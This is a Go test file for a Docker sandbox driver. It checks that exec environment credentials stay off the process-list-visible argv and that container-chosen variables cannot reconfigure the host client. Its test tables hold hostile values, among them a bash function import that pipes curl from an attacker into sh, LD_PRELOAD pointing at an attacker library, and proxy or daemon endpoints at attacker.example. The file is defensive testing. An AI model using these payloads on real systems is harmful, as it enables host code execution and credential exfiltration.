package docker

import (
	"bytes"
	"context"
	"os"
	"slices"
	"strings"
	"testing"

	"github.com/SocialGouv/iterion/internal/envtrust"
	iterlog "github.com/SocialGouv/iterion/pkg/log"
	"github.com/SocialGouv/iterion/pkg/sandbox"
)

// execEnvProbeName is the name every witness here passes per exec, so the
// assertions can speak about one variable whatever the exec's shape.
const execEnvProbeName = "ITERION_EXEC_PROBE"

// execEnvRun builds a *Run bound to no daemon: Command is pure, so the argv
// and the envp it returns are the whole subject. The User makes the argv
// carry a flag AFTER the env flags, so an assertion on what follows `--env`
// is a claim and not an artefact of the flag order.
func execEnvRun(logger *iterlog.Logger) *Run {
	return &Run{
		driver:      &Driver{cli: CLI{rt: RuntimeDocker}, logger: logger},
		containerID: "deadbeefcafe",
		prepared: &Prepared{
			workspace: "/workspace",
			spec:      sandbox.Spec{User: "1000:1000"},
			cli:       CLI{rt: RuntimeDocker},
		},
		inContainerWorkspace: "/workspace",
	}
}

// envFlagNames reads the argument that FOLLOWS each `--env` of an argv —
// the name under the name-only channel, the whole `NAME=value` pair under
// the form this change removed.
func envFlagNames(argv []string) []string {
	var names []string
	for i, arg := range argv {
		if arg == "--env" && i+1 < len(argv) {
			names = append(names, argv[i+1])
		}
	}
	return names
}

// effectiveEnvValue reads what the client process will actually run with
// for name: os/exec dedups the envp before execve and keeps the LAST entry
// of a repeated name, so an earlier entry of the same name is not the value
// anyone sees.
func effectiveEnvValue(env []string, name string) (string, bool) {
	value, found := "", false
	for _, kv := range env {
		if k, v, ok := strings.Cut(kv, "="); ok && k == name {
			value, found = v, true
		}
	}
	return value, found
}

// TestTheDockerExecEnvNeverRidesTheArgv is the witness of #2845 item 2.
//
// A materialised value on a `docker exec` argv is readable by every uid on
// the machine — `ps`, /proc/<pid>/cmdline — for the whole life of the exec,
// which for an agent node is the node's: what rides this channel is the
// provider credential a sandboxed runner spends and the environment
// `MaterializeAuthoredShellEnv` hands an authored command, so the argv is
// exactly where neither may be. The name-only flag is the channel, and the
// pair in the client's own envp is what makes it work: docker reads a
// name-only `--env K` from the client's environment, and a name the client
// does not carry reaches the container UNSET (measured on docker 29.9.2) —
// so both halves are read here, the daemon's view of the argv and the envp
// the client is started with.
func TestTheDockerExecEnvNeverRidesTheArgv(t *testing.T) {
	rt, log := fakeDaemon(t)
	d := fakeDriver(t, rt)
	ctx := context.Background()

	prepared, err := d.Prepare(ctx, lifecycleSpec())
	if err != nil {
		t.Fatalf("Prepare: %v", err)
	}
	run, err := d.Start(ctx, prepared, sandbox.RunInfo{RunID: "run_exec_env", WorkspacePath: t.TempDir()})
	if err != nil {
		t.Fatalf("Start: %v", err)
	}
	t.Cleanup(func() { _ = run.Cleanup(ctx) })

	const value = "sk-live-2845-never-on-an-argv"
	env := map[string]string{execEnvProbeName: value, "ITERION_EXEC_PLAIN": "ordinary"}

	// What the driver builds: names on the argv, pairs in the envp.
	dockerRun, ok := run.(*Run)
	if !ok {
		t.Fatalf("Start returned %T, want *Run", run)
	}
	cmd := dockerRun.Command(ctx, []string{"printenv", execEnvProbeName}, sandbox.ExecOpts{Env: env})
	if got, want := envFlagNames(cmd.Args), []string{"ITERION_EXEC_PLAIN", execEnvProbeName}; !slices.Equal(got, want) {
		t.Errorf("the exec argv's `--env` flags carry %q, want the NAMES alone in sorted order %q", got, want)
	}
	for _, arg := range cmd.Args {
		if strings.Contains(arg, value) {
			t.Errorf("the exec argv carries the value (%q): a host process list shows it to every uid for the exec's whole life; argv=%q", arg, cmd.Args)
		}
	}
	if !slices.Contains(cmd.Env, execEnvProbeName+"="+value) {
		t.Errorf("the exec's envp does not carry %s=<value>: docker reads a name-only `--env` from the client's own environment, so without the pair the container gets the name UNSET; env has %d entries", execEnvProbeName, len(cmd.Env))
	}
	if !slices.ContainsFunc(cmd.Env, func(kv string) bool { return strings.HasPrefix(kv, "PATH=") }) {
		t.Errorf("the exec's envp dropped the inherited environment: the docker client needs its own (PATH, DOCKER_HOST, HOME) to reach the daemon at all")
	}

	// What the daemon is asked to do, read back from the stand-in's log:
	// the argv that actually left this process.
	if _, err := run.Exec(ctx, []string{"printenv", execEnvProbeName}, sandbox.ExecOpts{Env: env}); err != nil {
		t.Fatalf("Exec: %v", err)
	}
	execArgv := argvOf(t, log, "exec")
	if got, want := envPairsOfArgs(execArgv), []string{"ITERION_EXEC_PLAIN", execEnvProbeName}; !slices.Equal(got, want) {
		t.Errorf("the daemon saw `--env` %q, want the NAMES alone %q", got, want)
	}
	for _, arg := range execArgv {
		if strings.Contains(arg, value) {
			t.Errorf("the daemon was handed the value on the argv (%q); argv=%q", arg, execArgv)
		}
	}
}

// TestNoExecShapeOfTheDockerDriverPutsAnEnvValueOnTheArgv closes the class
// at the chokepoint: [Run.Command] is the ONE place a per-exec env reaches
// docker, and its shapes are the only variation a caller can produce
// (default or custom workdir, a caller's stdin, the kept-open stdin of an
// RPC session, an oversized script streamed as `sh -s`). Every shape is
// walked against the value shapes that could each find their own hole: a
// token, the empty value whose pair form is how a name is overridden, a
// value holding an `=`, and a multi-line value.
//
// The pair form is asserted ABSENT rather than the value asserted unseen,
// so the empty value — which no "does the argv contain it" test can fail
// on — is a claim here too.
func TestNoExecShapeOfTheDockerDriverPutsAnEnvValueOnTheArgv(t *testing.T) {
	r := execEnvRun(discardLogger())
	oversized := "cat <<'EOF'\n" + strings.Repeat("x", sandbox.MaxInlineArgBytes+1) + "\nEOF\n"
	// This process ALREADY carries the name: the envp seeded from it is
	// where the client reads the name-only flag, so the exec's own pair
	// must come after the inherited one — the precedence assertion below
	// has a subject only because of this.
	t.Setenv(execEnvProbeName, "ambient-must-lose")

	shapes := []struct {
		name string
		argv []string
		opts sandbox.ExecOpts
	}{
		{"plain argv", []string{"printenv", execEnvProbeName}, sandbox.ExecOpts{}},
		{"custom workdir", []string{"printenv", execEnvProbeName}, sandbox.ExecOpts{WorkDir: "/elsewhere"}},
		{"a caller's stdin", []string{"sh", "-c", "cat"}, sandbox.ExecOpts{Stdin: strings.NewReader("in")}},
		{"stdin kept open (an RPC session)", []string{"iterion", "__claw-runner"}, sandbox.ExecOpts{KeepStdinOpen: true}},
		{"an oversized script streamed as `sh -s`", []string{"sh", "-c", oversized}, sandbox.ExecOpts{}},
	}
	values := []struct {
		name  string
		value string
	}{
		{"a provider token", "sk-live-2845-0123456789abcdef"},
		{"the empty value (the override form)", ""},
		{"a value holding an =", "postgres://u:p@h/db?sslmode=require"},
		{"a multi-line value", "-----BEGIN PRIVATE KEY-----\nMIIBOgIBAAJBAK\n-----END PRIVATE KEY-----"},
	}

	for _, shape := range shapes {
		for _, v := range values {
			t.Run(shape.name+"/"+v.name, func(t *testing.T) {
				opts := shape.opts
				opts.Env = map[string]string{execEnvProbeName: v.value}
				cmd := r.Command(context.Background(), shape.argv, opts)

				if got, want := envFlagNames(cmd.Args), []string{execEnvProbeName}; !slices.Equal(got, want) {
					t.Fatalf("`--env` flags = %q, want the name alone %q", got, want)
				}
				for _, arg := range cmd.Args {
					if strings.HasPrefix(arg, execEnvProbeName+"=") {
						t.Errorf("the argv carries the PAIR form %q: the value is in the host's process list for the exec's whole life", arg)
					}
					if v.value != "" && strings.Contains(arg, v.value) {
						t.Errorf("the argv carries the value inside %q", arg)
					}
				}
				if !slices.Contains(cmd.Env, execEnvProbeName+"="+v.value) {
					t.Errorf("the envp does not carry %s=%q: the name-only flag would reach the container unset", execEnvProbeName, v.value)
				}
				// os/exec dedups the envp before execve and keeps the LAST
				// entry of a repeated name, so the pair must be the last
				// one of its name to hold the precedence `--env NAME=value`
				// had over an ambient value. The claim is scoped to a name
				// the client does NOT read for itself — this probe: the
				// names it does read keep their pair on the argv and the
				// client keeps its own value, which is
				// TestTheExecEnvNeverReconfiguresTheRuntimeClient's subject.
				if got, ok := effectiveEnvValue(cmd.Env, execEnvProbeName); !ok || got != v.value {
					t.Errorf("the envp resolves %s to %q (found=%t), want the exec's own value %q: os/exec keeps the last entry, and the ambient value would win otherwise",
						execEnvProbeName, got, ok, v.value)
				}
			})
		}
	}
}

// TestTheExecEnvChannelRefusesOnlyWhatItCannotCarry pins what moved WITH
// the channel: the name still rides the argv, so its rule is unchanged,
// while a value that only docker's whitespace-tokenising parser objected to
// — a newline, a carriage return — is a legitimate secret in a process
// environment (a PEM key, a JSON blob) and must now arrive intact. A NUL
// stays refused because no process environment can hold one: os/exec
// rejects the whole envp, so keeping it would fail the exec instead of
// skipping one name. Each refusal warns, naming the variable.
//
// A name that keeps the pair on the argv keeps the argv's whole rule with
// it, value included: the widening belongs to the channel, not to the
// driver.
//
// One name shape is carried by NEITHER form and refused outright: a '*' in
// it, which `podman exec --env` with no value reads as a host-environment
// glob, while the pair form that sets the one literal variable would put
// its value back in the host's process list with no host-side reader to
// serve — the defect this tip closes, inside the fix that closes it. The
// container's creation env still sets a literal one, which the warning
// names.
func TestTheExecEnvChannelRefusesOnlyWhatItCannotCarry(t *testing.T) {
	for _, tc := range []struct {
		name    string
		envName string
		value   string
		carried bool
		warn    string
	}{
		{"a multi-line value", execEnvProbeName, "line1\nline2", true, ""},
		{"a carriage return", execEnvProbeName, "line1\rline2", true, ""},
		{"a NUL in the value", execEnvProbeName, "before\x00after", false, "NUL"},
		{"an = in the name", "BAD=NAME", "refused-2845-value", false, "invalid env var name"},
		{"a newline in the name", "BAD\nNAME", "refused-2845-value", false, "invalid env var name"},
		{"a multi-line value under a name the client reads", "HOME", "line1\nline2", false, "newline"},
		{"a glob-shaped name", "AWS_*", "sk-live-2845-never-on-an-argv-either", false, "glob"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			var logged bytes.Buffer
			r := execEnvRun(iterlog.New(iterlog.LevelWarn, &logged))
			cmd := r.Command(context.Background(), []string{"printenv", tc.envName}, sandbox.ExecOpts{
				Env: map[string]string{tc.envName: tc.value},
			})

			// No name of this table is one the client reads for itself
			// except HOME, whose row is refused, so the value belongs on
			// no argv here whatever the verdict.
			for _, arg := range cmd.Args {
				if strings.Contains(arg, tc.value) {
					t.Errorf("the argv carries the value inside %q: a refusal that puts the value in the host's process list is the defect #2845 closes", arg)
				}
			}
			gotCarried := slices.Contains(cmd.Env, tc.envName+"="+tc.value)
			if gotCarried != tc.carried {
				t.Errorf("the envp carries %s=%q: %t, want %t", tc.envName, tc.value, gotCarried, tc.carried)
			}
			if gotNamed := slices.Contains(envFlagNames(cmd.Args), tc.envName); gotNamed != tc.carried {
				t.Errorf("the argv names %s: %t, want %t — the flag and the pair are one decision", tc.envName, gotNamed, tc.carried)
			}
			if tc.warn == "" {
				if logged.Len() != 0 {
					t.Errorf("a value this channel carries must not be warned about, got %q", logged.String())
				}
				return
			}
			if !strings.Contains(logged.String(), tc.warn) || !strings.Contains(logged.String(), tc.envName) {
				t.Errorf("the skip must warn naming the variable and the reason (%q), got %q", tc.warn, logged.String())
			}
		})
	}
}

// TestTheExecEnvNeverReconfiguresTheRuntimeClient is the other half of the
// name-only channel. The pair lands in the CLIENT's own environment, so a
// name the client reads for ITSELF would let the container reconfigure the
// client that carries the exec — and the engine really does send such
// names per exec: `runnerEnv["HOME"] = clawRunnerHome(...)` on every claw
// node (pkg/backend/model/claw_backend.go), the devbox profile's PATH on
// every node it provisions (pkg/runtime/devbox_host.go through
// Task.ExtraEnv), `LC_ALL` on the scratch bank's tar
// (pkg/runtime/scratch_bank.go).
//
// Measured on docker 29.9.2: the client resolves its endpoint from
// $HOME/.docker/config.json — a HOME whose config names an absent context
// exits `docker exec` on "unable to resolve docker endpoint" before any
// daemon is reached, and the claw runner's HOME is a /tmp path a
// co-resident uid can plant a context in, which would be handed the exec's
// whole environment, credential included. So those names keep the pair on
// the argv (a path, an endpoint, a locale — never a credential) and the
// client keeps its own value, while the credential sent in the same exec
// still travels off the argv.
//
// The second family is the EXECUTION class — internal/envtrust's
// ExecutionGradeName, the ONE inventory the three dotenv lanes
// (DotenvPlantRefused), the bot-var gate and pkg/sandbox/devcontainer's
// deny class already ask: the names whose value makes a process iterion
// starts LOAD, EXECUTE or TRUST what they name. The runtime client is such
// a process — dynamically linked, and it runs credential helpers
// (`docker-credential-*`) and CLI plugins of its own off PATH — so a
// container-destined LD_PRELOAD, GCONV_PATH or BASH_ENV in the client's
// environment runs the container's choice on the HOST, outside the sandbox
// altogether: strictly worse than a value in a process list. They keep the
// pair, the channel every name had before #2845, so the value reaches the
// container and nothing on the host reads it.
//
// One row per family of that inventory, so the two lists cannot drift apart
// again: a hand-rolled copy of it is what the first round of this fix had.
func TestTheExecEnvNeverReconfiguresTheRuntimeClient(t *testing.T) {
	const credential = "sk-live-2845-still-off-the-argv"
	// The engine's own PATH stays reachable so exec.Command still resolves
	// the runtime binary; the prefix is what makes the value distinctive.
	enginePath := "/engine/own/bin:" + os.Getenv("PATH")

	for _, tc := range []struct {
		name        string
		envName     string
		value       string // what the exec asks for, for the container
		ambient     string // what the engine's own environment holds
		engineHolds bool
	}{
		{"the claw runner's container HOME", "HOME", "/tmp/iterion-scratch/claw-runner-home-deadbeef", "/home/engine-operator", true},
		{"a devbox profile PATH", "PATH", "/container/devbox/bin:/usr/bin", enginePath, true},
		{"an inner daemon endpoint", "DOCKER_HOST", "tcp://inner-dind:2375", "unix:///var/run/docker.sock", true},
		{"the rootless runtime dir", "XDG_RUNTIME_DIR", "/tmp/iterion-scratch/xdg", "/run/user/1000", true},
		{"podman's registry credentials file", "REGISTRY_AUTH_FILE", "/workspace/.iterion/auth.json", "/home/engine-operator/.config/containers/auth.json", true},
		{"the scratch bank's tar locale", "LC_ALL", "C", "fr_FR.UTF-8", true},
		// podman's own endpoint family, the one a roll-call of names let
		// out. Measured on podman 4.9.3: with CONTAINER_HOST in the
		// client's environment the client dials that endpoint with no
		// `--remote` flag and POSTs `/libpod/containers/<id>/exec` there
		// with the whole `Env` array in the body — the exec's credential
		// handed to the host the CONTAINER named. The verdict is
		// runtime-blind on purpose: [Detect] picks either CLI, so a
		// verdict that moved with the installed one would be a verdict
		// about the machine.
		{"podman's remote endpoint", "CONTAINER_HOST", "tcp://attacker.example:2375", "unix:///run/podman/podman.sock", true},
		{"podman's named connection", "CONTAINER_CONNECTION", "attacker-remote", "operator-dev", true},
		{"podman's ssh identity", "CONTAINER_SSHKEY", "/workspace/.iterion/id_ed25519", "/home/engine-operator/.ssh/id_ed25519", true},
		{"podman's ssh passphrase", "CONTAINER_PASSPHRASE", "attacker-passphrase", "operator-passphrase", true},
		{"podman's named-connection file", "PODMAN_CONNECTIONS_CONF", "/workspace/.iterion/connections.json", "/home/engine-operator/.config/containers/podman-connections.json", true},
		{"podman's storage driver", "STORAGE_DRIVER", "vfs", "overlay", true},
		// A docker name past the same roll-call, which the namespace now
		// answers: the headers the client puts on its own daemon calls.
		{"a docker name beyond the roll-call", "DOCKER_CUSTOM_HEADERS", "X-Iterion-Forged: container", "", false},
		// The outbound proxies, which Go's own net/http consults for every
		// request the client sends — both spellings, as [proxyEnvNames]
		// says. Measured on docker 29.9.2 against a `tcp://` daemon: a
		// container-destined HTTP_PROXY carried `GET /_ping` and
		// `POST /containers/<id>/exec`, `Env` array included, in absolute
		// form through the host the container named. The ambient value is
		// the run's own proxy, whose token the argv therefore does expose —
		// warned by name at the call site, and published by the container's
		// own environment anyway ([hostNetworkArgs]).
		{"the outbound proxy", "HTTPS_PROXY", "http://attacker.example:3128", "http://t:run-token@host.docker.internal:18080", true},
		{"the lower-case proxy spelling net/http also reads", "http_proxy", "http://attacker.example:3128", "http://t:run-token@host.docker.internal:18080", true},
		{"the hosts the client goes direct to", "NO_PROXY", "attacker.example", "host.docker.internal,localhost", true},
		{"the client's own message language", "LANG", "fr_FR.UTF-8", "C", true},
		// The execution class, one row per family of envtrust's inventory.
		// Each ambient value is the engine's own, which the client must keep.
		{"the loader's preload", "LD_PRELOAD", "/workspace/.iterion/attacker.so", "/engine/own/preload.so", true},
		{"the loader's library path", "LD_LIBRARY_PATH", "/workspace/.iterion/lib", "/engine/own/lib", true},
		{"openssl's provider configuration", "OPENSSL_CONF", "/workspace/.iterion/openssl.cnf", "/engine/own/openssl.cnf", true},
		{"a bash function import", "BASH_FUNC_git%%", "() { curl -s attacker | sh; }", "() { /usr/bin/git \"$@\"; }", true},
		{"bun's own options", "BUN_OPTIONS", "--preload /workspace/.iterion/p.ts", "--smol", true},
		{"npm's options for every node it spawns", "NPM_CONFIG_NODE_OPTIONS", "--require /workspace/.iterion/r.js", "--max-old-space-size=4096", true},
		{"nix's whole configuration", "NIX_CONFIG", "plugin-files = /workspace/.iterion/p.so", "experimental-features = nix-command", true},
		{"an XDG dir beyond the client's own four", "XDG_CONFIG_DIRS", "/workspace/.iterion/xdg", "/etc/xdg", true},
		{"glibc's iconv modules", "GCONV_PATH", "/workspace/.iterion/gconv", "/engine/own/gconv", true},
		{"bash's startup file", "BASH_ENV", "/workspace/.iterion/rc.sh", "/engine/own/rc.sh", true},
		{"the node runtime's options", "NODE_OPTIONS", "--require /workspace/.iterion/r.js", "--max-old-space-size=4096", true},
		// And one the engine never set, so the absence of the container's
		// value in the client's envp is a claim of its own.
		{"a loader name the engine never set", "LD_ITERION_2845_ABSENT", "/workspace/.iterion/attacker.so", "", false},
	} {
		t.Run(tc.name, func(t *testing.T) {
			if tc.engineHolds {
				t.Setenv(tc.envName, tc.ambient)
			}
			r := execEnvRun(discardLogger())
			cmd := r.Command(context.Background(), []string{"printenv", tc.envName}, sandbox.ExecOpts{
				Env: map[string]string{tc.envName: tc.value, execEnvProbeName: credential},
			})

			// The container still gets it, by the one channel that does not
			// go through the client's own environment: the pair on the argv.
			flags := envFlagNames(cmd.Args)
			if !slices.Contains(flags, tc.envName+"="+tc.value) {
				t.Errorf("the argv's `--env` flags are %q, want the PAIR %s=%q: the container needs the value and the client's own environment is not where it may travel", flags, tc.envName, tc.value)
			}
			if slices.Contains(flags, tc.envName) {
				t.Errorf("the argv names %s alone: the name-only channel reads the value from the CLIENT's environment, so the container's value would reconfigure the client itself", tc.envName)
			}

			// The client keeps its own.
			got, ok := effectiveEnvValue(cmd.Env, tc.envName)
			if tc.engineHolds {
				if !ok || got != tc.ambient {
					t.Errorf("the client runs with %s=%q (found=%t), want the ENGINE's own %q: a container-chosen %s decides which daemon receives this exec, and the exec's whole env goes with it", tc.envName, got, ok, tc.ambient, tc.envName)
				}
			} else if ok {
				t.Errorf("the client's envp carries %s=%q, want it absent: the host's own loader reads that name, so the container's value would run on the host", tc.envName, got)
			}

			// And the guarantee this tip is for is untouched beside it.
			if !slices.Contains(flags, execEnvProbeName) {
				t.Errorf("the argv's `--env` flags are %q, want %s named alone", flags, execEnvProbeName)
			}
			for _, arg := range cmd.Args {
				if strings.Contains(arg, credential) {
					t.Errorf("the argv carries the credential inside %q", arg)
				}
			}
			if v, ok := effectiveEnvValue(cmd.Env, execEnvProbeName); !ok || v != credential {
				t.Errorf("the envp resolves %s to %q (found=%t), want the credential: the name-only flag would reach the container unset", execEnvProbeName, v, ok)
			}
		})
	}
}

// TestALowerCaseClientNameFollowsThePlatformsOwnFolding pins the one fold
// in [execEnvKeepsThePairOnTheArgv] to the platform's own rule.
//
// The two halves of the predicate disagreed on case: the client's own
// names are matched as spelled while envtrust.ExecutionGradeName
// upper-cases deliberately. As spelled is right on Unix — `docker_host` is
// a DIFFERENT variable there and the client never reads it, so sending its
// value to the argv would expose it for no host-side reader — and wrong on
// Windows, where the client's own DOCKER_HOST lookup finds it.
// envtrust.CanonicalName is exactly that rule, and pkg/internal/proc has a
// windows half, so the platform is a real subject rather than a hypothesis.
func TestALowerCaseClientNameFollowsThePlatformsOwnFolding(t *testing.T) {
	const (
		containerValue = "tcp://attacker.example:2375"
		engineValue    = "unix:///var/run/docker.sock"
	)
	for _, tc := range []struct {
		platform    string
		keepsOnArgv bool
	}{
		{"linux", false},
		{"windows", true},
	} {
		t.Run(tc.platform, func(t *testing.T) {
			envtrust.UseGOOSForTest(t, tc.platform)
			t.Setenv("docker_host", engineValue)
			r := execEnvRun(discardLogger())
			cmd := r.Command(context.Background(), []string{"true"}, sandbox.ExecOpts{
				// The probe takes the name-only channel whatever the
				// platform, so cmd.Env is built in both halves: a nil Env
				// means "inherit the parent's verbatim", which would leave
				// the envp claim unread rather than proven.
				Env: map[string]string{"docker_host": containerValue, execEnvProbeName: "probe"},
			})

			flags := envFlagNames(cmd.Args)
			got, found := effectiveEnvValue(cmd.Env, "docker_host")
			if tc.keepsOnArgv {
				if !slices.Contains(flags, "docker_host="+containerValue) {
					t.Errorf("the argv's `--env` flags are %q, want the PAIR docker_host=%q: on %s the client's own DOCKER_HOST lookup finds this spelling", flags, containerValue, tc.platform)
				}
				if !found || got != engineValue {
					t.Errorf("the client runs with docker_host=%q (found=%t), want the ENGINE's own %q: on %s the container's value would pick the daemon", got, found, engineValue, tc.platform)
				}
				return
			}
			if !slices.Contains(flags, "docker_host") {
				t.Errorf("the argv's `--env` flags are %q, want docker_host named ALONE: on %s the client reads DOCKER_HOST only, so the value has no host-side reader to be exposed for", flags, tc.platform)
			}
			if found && got != containerValue {
				t.Errorf("the client's envp resolves docker_host to %q, want the exec's own %q: the name-only flag reads the value from there", got, containerValue)
			}
			for _, arg := range cmd.Args {
				if strings.Contains(arg, containerValue) {
					t.Errorf("the argv carries the value inside %q: on %s nothing on the host side reads this spelling", arg, tc.platform)
				}
			}
		})
	}
}

// TestAClientReadNameCarryingACredentialIsWarnedAndNotDropped covers
// #2845's residual: the one case where this channel still puts a value in
// the host's process list, and what it says about it.
//
// A name the HOST client reads cannot take the name-only channel — that
// channel works by putting the pair in the client's own environment, which
// is where a container-chosen value reconfigures the client (measured: a
// CONTAINER_HOST sends the whole exec, credential included, to an endpoint
// the container named; an HTTP_PROXY carries the same conversation through
// a host it named). So the pair rides the argv, and when the NAME reads as
// a credential (envtrust.CredentialShapedName, the one list the bot-var
// gate, the dotenv plant and the run-record redaction already ask) the
// exposure is said out loud, by name, where it happens.
//
// Warned, never dropped: the operator asked the container to have this
// value, and the residual's remedy — a name the host side does not
// consume, or a file secret — is theirs to take. And warned only there:
// the credential of every claw node (ANTHROPIC_API_KEY and its family)
// takes the name-only channel, so a blanket credential warning would be
// noise on every exec of every run.
func TestAClientReadNameCarryingACredentialIsWarnedAndNotDropped(t *testing.T) {
	for _, tc := range []struct {
		name     string
		envName  string
		value    string
		wantPair bool
		wantWarn bool
	}{
		{"the run's own proxy token", "HTTPS_PROXY", "http://t:run-token-2845@host.docker.internal:18080", true, true},
		{"podman's ssh passphrase", "CONTAINER_PASSPHRASE", "operator-passphrase-2845", true, true},
		{"npm's auth under an execution-grade name", "NPM_CONFIG__AUTH", "c2stbGl2ZS0yODQ1", true, true},
		{"the same name set to the empty override", "HTTPS_PROXY", "", true, false},
		{"a client-read name with no credential spelling", "DOCKER_HOST", "tcp://inner-dind:2375", true, false},
		{"the credential of every claw node, which the client never reads", "ANTHROPIC_API_KEY", "sk-live-2845-off-the-argv", false, false},
	} {
		t.Run(tc.name, func(t *testing.T) {
			var logged bytes.Buffer
			r := execEnvRun(iterlog.New(iterlog.LevelWarn, &logged))
			cmd := r.Command(context.Background(), []string{"true"}, sandbox.ExecOpts{
				Env: map[string]string{tc.envName: tc.value},
			})

			flags := envFlagNames(cmd.Args)
			if tc.wantPair {
				if !slices.Contains(flags, tc.envName+"="+tc.value) {
					t.Errorf("the argv's `--env` flags are %q, want the PAIR %s=%q: a name the client reads has nowhere else to travel, and dropping it would refuse what the operator asked the container to have", flags, tc.envName, tc.value)
				}
			} else {
				if !slices.Contains(flags, tc.envName) {
					t.Errorf("the argv's `--env` flags are %q, want %s named ALONE", flags, tc.envName)
				}
				for _, arg := range cmd.Args {
					if tc.value != "" && strings.Contains(arg, tc.value) {
						t.Errorf("the argv carries the value inside %q", arg)
					}
				}
			}

			if !tc.wantWarn {
				if logged.Len() != 0 {
					t.Errorf("nothing to warn about here, got %q: a warning on a name whose value never reaches an argv — or on the empty override — is noise on every exec of every run", logged.String())
				}
				return
			}
			for _, want := range []string{tc.envName, "command line"} {
				if !strings.Contains(logged.String(), want) {
					t.Errorf("the warning must name %q, got %q", want, logged.String())
				}
			}
			if strings.Contains(logged.String(), tc.value) {
				t.Errorf("the warning repeats the value itself (%q): a log line is one more place it is readable", logged.String())
			}
		})
	}
}
